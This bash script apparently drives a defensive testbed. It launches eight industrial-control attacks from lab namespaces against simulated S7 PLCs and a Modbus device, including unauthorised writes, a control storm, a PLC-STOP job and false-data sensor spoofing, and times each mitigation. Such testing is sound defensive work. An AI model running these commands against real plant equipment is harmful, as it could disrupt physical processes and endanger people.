#!/usr/bin/env bash
# night_attack_battery.sh — rotate through the attack vectors, measuring each.
# Covers: (2) all attack ways, (3) CARS behaviour, (4) per-attack MTTM,
#         (5) practical production OT attacks. One pass = one sweep of vectors.
# Usage: ROUNDS=n bash night_attack_battery.sh   (sourced env from orchestrator)
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; source "$HERE/night_lib.sh"
mttm_header
ROUNDS="${ROUNDS:-1}"
GAP="${GAP:-4}"   # > COOLDOWN(3s) so back-to-back trials are not dedup-suppressed

# each vector: a realistic production OT attack, launched from a namespace, then measured.
run_round(){
  # 1) reconnaissance / unauthorised connect from an unregistered host
  measure_attack recon_connect "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --read --count 1; sleep "$GAP"
  # 2) unauthorised WRITE to the critical PLC (actuation) from the unregistered host
  measure_attack unauth_write "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --val 0x08 --count 3; sleep "$GAP"
  # 3) unauthorised CONTROL storm (bounded) — actuator flicker
  measure_attack unauth_control "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --storm --secs 3 --hz 10; sleep "$GAP"
  # 4) engineering PLC-STOP job (kill switch) from the unregistered host
  measure_attack unauth_stop "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$S7" --host "$PLC1" --stop; sleep "$GAP"
  # 5) Modbus write attack on the LOW asset
  measure_attack modbus_write "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$MBATK" --host "$MODBUS" --attack write --count 3; sleep "$GAP"
  # 6) false-data injection from the COMPROMISED-BUT-ALLOWLISTED supervisory host (first-packet case)
  measure_attack fdi_scada "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 20 --secs 3 --hz 20; sleep "$GAP"
  # 7) sensor-spoof-high from the allowlisted host (reported-full deception)
  measure_attack fdi_high "$IP_OP" "$NS_OP" \
    sudo ip netns exec "$NS_OP" python3 "$S7" --host "$PLC1" --dbspoof --db 7 --offset 0 --spoofval 90 --secs 3 --hz 20; sleep "$GAP"
  # 8) out-of-state / forged traffic from the unregistered host (Modbus scan as a stand-in probe)
  measure_attack recon_scan "$IP_ATK" "$NS_ATK" \
    sudo ip netns exec "$NS_ATK" python3 "$MBATK" --host "$MODBUS" --attack scan; sleep "$GAP"
}

log "attack battery: $ROUNDS round(s), 8 vectors each"
for r in $(seq 1 "$ROUNDS"); do
  log "battery round $r/$ROUNDS"
  run_round
  greencheck || { log "greencheck failed mid-battery; self-healing"; selfheal; arm; }
done
log "attack battery done"
